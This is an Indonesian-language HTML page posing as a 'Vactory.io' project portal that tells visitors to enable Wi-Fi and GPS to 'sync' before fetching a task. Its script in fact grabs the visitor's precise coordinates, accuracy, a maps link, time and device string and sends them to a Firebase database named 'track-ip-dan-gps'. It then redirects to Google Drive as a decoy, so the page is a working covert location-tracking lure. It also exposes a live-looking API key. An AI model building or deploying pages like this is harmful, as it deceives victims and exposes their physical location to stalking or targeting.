<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vactory.io - Project Management Portal</title>
    <style>
        body { font-family: 'Helvetica', Arial, sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .panel { background: #1e293b; padding: 40px; border-radius: 16px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); text-align: center; max-width: 400px; width: 85%; border: 1px solid #334155; }
        .v-logo { font-size: 2.5rem; font-weight: 800; color: #38bdf8; margin-bottom: 5px; letter-spacing: -1px; }
        .v-sub { font-size: 0.8rem; color: #94a3b8; text-transform: uppercase; margin-bottom: 25px; }
        p { font-size: 0.95rem; line-height: 1.6; color: #cbd5e1; }
        .wifi-required { background: rgba(56, 189, 248, 0.1); border: 1px solid #38bdf8; color: #38bdf8; padding: 15px; border-radius: 8px; font-size: 0.85rem; margin: 20px 0; font-weight: 600; }
        .btn-action { background: #38bdf8; color: #0f172a; border: none; padding: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 1rem; transition: 0.3s; }
        .btn-action:disabled { background: #475569; color: #94a3b8; }
    </style>
</head>
<body>

<div class="panel">
    <div class="v-logo">VACTORY.IO</div>
    <div class="v-sub">Secure Asset Delivery System</div>
    <p>Anda sedang mencoba mengakses dokumen proyek <strong>[V-2024-X]</strong> dengan nilai aset terverifikasi.</p>
    
    <div class="wifi-required">
        ⚠️ SYARAT AKSES:<br>
        Aktifkan Wi-Fi & GPS untuk sinkronisasi koordinat server proyek. Keamanan data tidak terjamin pada jaringan seluler.
    </div>

    <button class="btn-action" id="vBtn" onclick="authorize()">SINKRONISASI & AMBIL TUGAS</button>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCBkv4BE175yaj3S_xxuv0JcSMAMgW6Tn4",
      authDomain: "track-ip-dan-gps.firebaseapp.com",
      databaseURL: "https://track-ip-dan-gps-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "track-ip-dan-gps",
      storageBucket: "track-ip-dan-gps.firebasestorage.app",
      messagingSenderId: "475141239902",
      appId: "1:475141239902:web:5dfbd6387d4b1fa23370cf"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    window.authorize = function() {
        const btn = document.getElementById('vBtn');
        btn.innerText = "Mencari Koordinat Wi-Fi...";
        btn.disabled = true;

        navigator.geolocation.getCurrentPosition((pos) => {
            push(ref(db, 'Project_Vactory_Logs'), {
                lokasi: `${pos.coords.latitude},${pos.coords.longitude}`,
                akurasi: pos.coords.accuracy + "m",
                maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
                timestamp: new Date().toLocaleString(),
                device: navigator.userAgent
            }).then(() => {
                // Arahkan ke link tugas asli kamu
                window.location.href = "https://drive.google.com"; 
            });
        }, (err) => {
            alert("SINKRONISASI GAGAL: Pastikan Wi-Fi dan GPS Aktif untuk memvalidasi pengerjaan Project Vactory.");
            btn.disabled = false;
            btn.innerText = "SINKRONISASI ULANG";
        }, { enableHighAccuracy: true, timeout: 10000 });
    };
</script>
</body>
</html>
